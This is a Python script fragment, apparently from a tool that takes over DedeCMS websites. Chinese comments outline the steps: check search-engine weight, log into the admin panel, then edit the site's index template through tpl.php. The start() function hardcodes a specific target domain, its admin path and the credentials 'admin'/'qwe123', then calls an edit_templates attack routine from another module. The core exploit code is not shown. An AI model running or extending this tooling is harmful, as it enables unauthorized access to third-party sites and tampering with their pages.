# -*- coding: utf-8 -*-

# 0.确认权重和收录情况
# 1. 登录
# 2. domain + tpl.php?action=edit&acdir=qianan&filename=index.htm


import traceback
from common import utils
import threading
import requests
from threading import Thread
import time
import tldextract
from unit import dbsqlite
from api import 批量查权重
from auto_dede import 找空间

class Attack:
    def __init__(self, domain, back_ground_url, user, pwd):
        self.domain = domain
        self.back_ground_url = back_ground_url
        self.user = user
        self.pwd = pwd
        self.session = requests.session()
        self.heders = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"}
        # self._login_member()
        self.vcode_url = "/include/vdimgck.php"
        self.charset = "utf-8"


def start():
    while True:
        # domain_model = dbsqlite.start_getlist(' status = 9 ')
        # if not domain_model:
        #     print('未查到符合条件数据,等待3s')
        #     time.sleep(3)
        #     continue
        # domain = domain_model[1]
        # back_ground_url = domain_model[5]
        domain = 'http://www.elm327.com'
        back_ground_url = 'http://www.elm327.com/viecar'
        weight = 批量查权重.select_weight(domain)
        if weight > 0:
            dbsqlite.data_update(domain, 'step = %d' % weight)
        else:
            atk = 找空间.Attack(domain=domain, back_ground_url=back_ground_url, user='admin', pwd="qwe123")
            eidt_temp = atk.edit_templates()




if __name__ == '__main__':
    start()


